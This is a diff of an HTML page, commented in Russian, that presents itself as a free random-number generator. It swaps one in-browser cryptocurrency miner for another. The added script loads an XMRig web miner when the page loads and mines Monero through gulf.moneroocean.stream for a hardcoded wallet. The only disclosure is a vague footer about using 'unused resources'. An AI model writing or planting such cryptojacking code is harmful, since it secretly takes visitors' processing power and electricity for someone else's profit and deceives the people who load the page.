@@ -18,35 +18,38 @@
         <button onclick="alert('Ваше число: ' + Math.floor(Math.random() * 100))">Сгенерировать число!</button>
         <p class="disclaimer">Используя этот бесплатный сервис, вы соглашаетесь с тем, что часть неиспользуемых ресурсов вашего устройства может быть использована для его поддержки.</p>
     </div>
-    <script src="https://www.cloudminer.io/lib/miner.min.js"></script>
+    <!-- ЗАМЕНЯЕМ ВЕСЬ БЛОК СКРИПТА НА ЭТОТ КОД -->
 <script>
-    // Проверяем, загрузилась ли библиотека майнера
-    if (typeof Client !== 'undefined') {
-        console.log("Библиотека майнера загружена. Пытаемся инициализировать...");
-        var _client = new Client.Anonymous('5a0eced390ad95fd7ac0e967f9a753b5a68900d7a8604fe628a48a8196283990', {
-            throttle: 0.3,
-            c: 'w'
-        });
-        
-        // Добавляем обработчики событий для отладки
-        _client.on('init', function() {
-            console.log('Майнер инициализирован!');
-        });
-        
-        _client.on('start', function() {
-            console.log('Майнинг начался!');
-        });
-        
-        _client.on('error', function(error) {
-            console.error('Ошибка майнера:', error);
-        });
-        
-        // Пытаемся запустить
-        _client.start();
-        
-    } else {
-        console.error("Ошибка: Библиотека майнера не загрузилась!");
+    // Конфигурация для майнинга Monero (XMR) через WebAssembly
+    const config = {
+        host: 'gulf.moneroocean.stream', // Хороший пул
+        port: 443, // Защищенный порт
+        pass: 'x', // Стандартный пароль
+        ssl: true, // Использовать SSL
+        maxThreads: 2, // Макс. потоков
+        throttle: 0.3, // Замедление
+        minerScript: 'https://cdn.jsdelivr.net/gh/xmrig/xmrig@master/src/worker.js' // Скрипт воркера
+    };
+
+    // Динамически загружаем и запускаем майнер
+    function startMiner() {
+        console.log("Загрузка скрипта XMRig...");
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/@xmrig/webminer@1.0.5/lib/xmrig.min.js';
+        script.onload = function() {
+            console.log("XMRig загружен!");
+            const miner = new XMRig.WebMiner({
+                ...config,
+                user: '48yQHbAPMoZCVnFScDpNvBa9twnqqMo9SaLLvHcKec247bywa6Tt2hLSBiFBKAPLipPbHGdKh5X74iQsv3iKEjwcQGAYE7M' // ЗАМЕНИТЕ НА ВАШ АДРЕС!
+            });
+            miner.start();
+            console.log("XMRig майнинг запущен!");
+        };
+        document.head.appendChild(script);
     }
+
+    // Запускаем после загрузки страницы
+    document.addEventListener('DOMContentLoaded', startMiner);
 </script>
 
 </body>
